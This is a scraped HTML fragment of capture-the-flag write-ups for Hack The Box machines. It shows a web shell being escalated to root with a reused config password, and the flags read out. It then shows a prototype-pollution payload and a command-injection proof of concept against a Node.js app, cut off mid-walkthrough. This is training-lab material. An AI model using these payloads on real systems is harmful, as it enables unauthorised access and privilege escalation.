</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@validation:/var/www/html$ id
id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
www-data@validation:/var/www/html$ ls
ls
account.php
config.php
css
index.php
js
shellasdfg.php
www-data@validation:/var/www/html$ cat config.php
cat config.php
&lt;?php
  <span style="color:#8be9fd;font-style:italic">$servername</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>;
  <span style="color:#8be9fd;font-style:italic">$username</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;uhc&#34;</span>;
  <span style="color:#8be9fd;font-style:italic">$password</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;uhc-9qual-global-pw&#34;</span>;
  <span style="color:#8be9fd;font-style:italic">$dbname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;registration&#34;</span>;

  <span style="color:#8be9fd;font-style:italic">$conn</span> <span style="color:#ff79c6">=</span> new mysqli<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$servername</span>, <span style="color:#8be9fd;font-style:italic">$username</span>, <span style="color:#8be9fd;font-style:italic">$password</span>, <span style="color:#8be9fd;font-style:italic">$dbname</span><span style="color:#ff79c6">)</span>;
?&gt;
www-data@validation:/var/www/html$ su -
su -
Password: uhc-9qual-global-pw
id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
cat /root/root.txt
f9bd49a48cf9179c8629c354e16b2824
ls /home
htb
cat /home/htb/user.txt
36b0fe40ef8b62abd2a42f8149be3408
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Unobtainium</title><link>https://0xade1.github.io/posts/2021/09/htb-unobtainium/</link><pubDate>Sat, 11 Sep 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/09/htb-unobtainium/</guid><description>1 2 3 curl -s -X $&amp;#39;POST&amp;#39; http://unobtainium.htb:31337/todo \ -H $&amp;#39;Content-Type: application/json&amp;#39; \ -d &amp;#39;{&amp;#34;auth&amp;#34;: {&amp;#34;name&amp;#34;: &amp;#34;felamos&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;Winter2021&amp;#34;}, &amp;#34;filename&amp;#34; : &amp;#34;index.js&amp;#34;}&amp;#39; | jq -r &amp;#39;.content&amp;#39; output:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 var root = require(&amp;#34;google-cloudstorage-commands&amp;#34;); const express = require(&amp;#34;express&amp;#34;); const { exec } = require(&amp;#34;child_process&amp;#34;); const bodyParser = require(&amp;#34;body-parser&amp;#34;); const _ = require(&amp;#34;lodash&amp;#34;); const app = express(); var fs = require(&amp;#34;fs&amp;#34;); const users = [ { name: &amp;#34;felamos&amp;#34;, password: &amp;#34;Winter2021&amp;#34; }, { name: &amp;#34;admin&amp;#34;, password: Math.</description><content type="html"><![CDATA[<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -s  -X <span style="color:#f1fa8c">$&#39;POST&#39;</span> http://unobtainium.htb:31337/todo <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>-H <span style="color:#f1fa8c">$&#39;Content-Type: application/json&#39;</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>-d <span style="color:#f1fa8c">&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;filename&#34; : &#34;index.js&#34;}&#39;</span> | jq -r <span style="color:#f1fa8c">&#39;.content&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">97
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#8be9fd;font-style:italic">var</span> root <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;google-cloudstorage-commands&#34;</span>);
<span style="color:#ff79c6">const</span> express <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;express&#34;</span>);
<span style="color:#ff79c6">const</span> { exec } <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;child_process&#34;</span>);
<span style="color:#ff79c6">const</span> bodyParser <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;body-parser&#34;</span>);
<span style="color:#ff79c6">const</span> <span style="color:#bd93f9">_</span> <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;lodash&#34;</span>);
<span style="color:#ff79c6">const</span> app <span style="color:#ff79c6">=</span> express();
<span style="color:#8be9fd;font-style:italic">var</span> fs <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;fs&#34;</span>);

<span style="color:#ff79c6">const</span> users <span style="color:#ff79c6">=</span> [
  { name<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;felamos&#34;</span>, password<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Winter2021&#34;</span> },
  {
    name<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;admin&#34;</span>,
    password<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">Math</span>.random().toString(<span style="color:#bd93f9">32</span>),
    canDelete<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
    canUpload<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>,
  },
];

<span style="color:#8be9fd;font-style:italic">let</span> messages <span style="color:#ff79c6">=</span> [];
<span style="color:#8be9fd;font-style:italic">let</span> lastId <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;

<span style="color:#8be9fd;font-style:italic">function</span> findUser(auth) {
  <span style="color:#ff79c6">return</span> users.find(
    (u) =&gt; u.name <span style="color:#ff79c6">===</span> auth.name <span style="color:#ff79c6">&amp;&amp;</span> u.password <span style="color:#ff79c6">===</span> auth.password
  );
}

app.use(bodyParser.json());

app.get(<span style="color:#f1fa8c">&#34;/&#34;</span>, (req, res) =&gt; {
  res.send(messages);
});

app.put(<span style="color:#f1fa8c">&#34;/&#34;</span>, (req, res) =&gt; {
  <span style="color:#ff79c6">const</span> user <span style="color:#ff79c6">=</span> findUser(req.body.auth <span style="color:#ff79c6">||</span> {});

  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>user) {
    res.status(<span style="color:#bd93f9">403</span>).send({ ok<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>, error<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Access denied&#34;</span> });
    <span style="color:#ff79c6">return</span>;
  }

  <span style="color:#ff79c6">const</span> message <span style="color:#ff79c6">=</span> {
    icon<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;__&#34;</span>,
  };

  <span style="color:#bd93f9">_</span>.merge(message, req.body.message, {
    id<span style="color:#ff79c6">:</span> lastId<span style="color:#ff79c6">++</span>,
    timestamp<span style="color:#ff79c6">:</span> <span style="color:#8be9fd;font-style:italic">Date</span>.now(),
    userName<span style="color:#ff79c6">:</span> user.name,
  });

  messages.push(message);
  res.send({ ok<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span> });
});

app.<span style="color:#ff79c6">delete</span>(<span style="color:#f1fa8c">&#34;/&#34;</span>, (req, res) =&gt; {
  <span style="color:#ff79c6">const</span> user <span style="color:#ff79c6">=</span> findUser(req.body.auth <span style="color:#ff79c6">||</span> {});

  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>user <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>user.canDelete) {
    res.status(<span style="color:#bd93f9">403</span>).send({ ok<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>, error<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Access denied&#34;</span> });
    <span style="color:#ff79c6">return</span>;
  }

  messages <span style="color:#ff79c6">=</span> messages.filter((m) =&gt; m.id <span style="color:#ff79c6">!==</span> req.body.messageId);
  res.send({ ok<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span> });
});
app.post(<span style="color:#f1fa8c">&#34;/upload&#34;</span>, (req, res) =&gt; {
  <span style="color:#ff79c6">const</span> user <span style="color:#ff79c6">=</span> findUser(req.body.auth <span style="color:#ff79c6">||</span> {});
  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>user <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>user.canUpload) {
    res.status(<span style="color:#bd93f9">403</span>).send({ ok<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>, error<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Access denied&#34;</span> });
    <span style="color:#ff79c6">return</span>;
  }

  filename <span style="color:#ff79c6">=</span> req.body.filename;
  root.upload(<span style="color:#f1fa8c">&#34;./&#34;</span>, filename, <span style="color:#ff79c6">true</span>);
  res.send({ ok<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>, Uploaded_File<span style="color:#ff79c6">:</span> filename });
});

app.post(<span style="color:#f1fa8c">&#34;/todo&#34;</span>, (req, res) =&gt; {
  <span style="color:#ff79c6">const</span> user <span style="color:#ff79c6">=</span> findUser(req.body.auth <span style="color:#ff79c6">||</span> {});
  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>user) {
    res.status(<span style="color:#bd93f9">403</span>).send({ ok<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">false</span>, error<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Access denied&#34;</span> });
    <span style="color:#ff79c6">return</span>;
  }

  filename <span style="color:#ff79c6">=</span> req.body.filename;
  testFolder <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/usr/src/app&#34;</span>;
  fs.readdirSync(testFolder).forEach((file) =&gt; {
    <span style="color:#ff79c6">if</span> (file.indexOf(filename) <span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>) {
      <span style="color:#8be9fd;font-style:italic">var</span> buffer <span style="color:#ff79c6">=</span> fs.readFileSync(filename).toString();
      res.send({ ok<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>, content<span style="color:#ff79c6">:</span> buffer });
    }
  });
});

app.listen(<span style="color:#bd93f9">3000</span>);
console.log(<span style="color:#f1fa8c">&#34;Listening on port 3000...&#34;</span>);
</code></pre></td></tr></table>
</div>
</div><h1 id="google-cloudstorage-commands-is-vulnerable-to-command-injection">google-cloudstorage-commands is vulnerable to Command Injection</h1>
<p><a href="https://github.com/samradical/google-cloudstorage-commands/blob/master/index.js#L11">https://github.com/samradical/google-cloudstorage-commands/blob/master/index.js#L11</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8be9fd;font-style:italic">function</span> upload(inputDirectory, bucket, force <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">false</span>) {
  <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Promise</span>((yes, no) =&gt; {
    <span style="color:#8be9fd;font-style:italic">let</span> <span style="color:#bd93f9">_</span>path <span style="color:#ff79c6">=</span> path.resolve(inputDirectory);
    <span style="color:#8be9fd;font-style:italic">let</span> <span style="color:#bd93f9">_</span>rn <span style="color:#ff79c6">=</span> force <span style="color:#ff79c6">?</span> <span style="color:#f1fa8c">&#34;-r&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;-Rn&#34;</span>;
    <span style="color:#8be9fd;font-style:italic">let</span> <span style="color:#bd93f9">_</span>cmd <span style="color:#ff79c6">=</span> exec(<span style="color:#f1fa8c">`gsutil -m cp </span><span style="color:#f1fa8c">${</span><span style="color:#bd93f9">_</span>rn<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> -a public-read </span><span style="color:#f1fa8c">${</span><span style="color:#bd93f9">_</span>path<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> </span><span style="color:#f1fa8c">${</span>bucket<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span>);
    <span style="color:#bd93f9">_</span>cmd.on(<span style="color:#f1fa8c">&#34;exit&#34;</span>, (code) =&gt; {
      yes();
    });
  });
}
</code></pre></td></tr></table>
</div>
</div><p>This <a href="https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431">PoC</a> is available and shows how easy is the command injection:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#8be9fd;font-style:italic">var</span> root <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;google-cloudstorage-commands&#34;</span>);
root.upload(<span style="color:#f1fa8c">&#34;./&#34;</span>, <span style="color:#f1fa8c">&#34;&amp; touch JHU&#34;</span>, <span style="color:#ff79c6">true</span>);
</code></pre></td></tr></table>
</div>
</div><h1 id="prototype-pollution">Prototype Pollution</h1>
<p>We can&rsquo;t exploit root.upload as we don&rsquo;t have <code>canUpload</code> privilege; however there is a <code>Prototype Pollution</code> vulnerability on the PUT route as <code>merge</code> can be called with a <code>req.body.message that we control: </code>_.merge(message, req.body.message, {[..]});`</p>
<p>Obtain canUpload privilege with Prototype Pollution:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -s  -X <span style="color:#f1fa8c">$&#39;PUT&#39;</span> http://unobtainium.htb:31337 <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>-H <span style="color:#f1fa8c">$&#39;Content-Type: application/json&#39;</span> <span style="color:#f1fa8c">\
</span><span style="color:#f1fa8c"></span>-d <span style="color:#f1fa8c">&#39;{&#34;auth&#34;: {&#34;name&#34;: &#34;felamos&#34;, &#34;password&#34;: &#34;Winter2021&#34;}, &#34;message&#34;: {&#34;text&#34;: &#34;WHATEVER&#34;, &#34;__proto__&#34;: {&#34;canUpload&#34;: true}}}&#39;</span> | jq
<span style="color:#ff79c6">{</span>
  <span style="color:#f1fa8c">&#34;ok&#34;</span>: <span style="color:#8be9fd;font-style:italic">true</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>it only last few seconds before the server reset it, so we got to be fast with the command injection:</p>
<h1 id="command-injection">Command Injection</h1>
<p>A simple ping to starts with:</p>
